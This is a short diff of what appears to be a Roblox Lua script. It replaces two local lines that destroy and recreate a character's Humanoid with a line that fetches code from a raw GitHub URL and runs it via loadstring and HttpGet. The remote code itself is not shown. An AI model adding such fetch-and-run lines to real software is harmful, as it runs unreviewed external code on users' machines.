@@ -9,5 +9,4 @@ local pos = char.Torso.Position
 wait(.3)
 local char = plr.Character
 char:MoveTo(pos)
-char.Humanoid:Destroy()
-Instance.new("Humanoid", char)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/alsoo3/scripts/main/humandie"))();
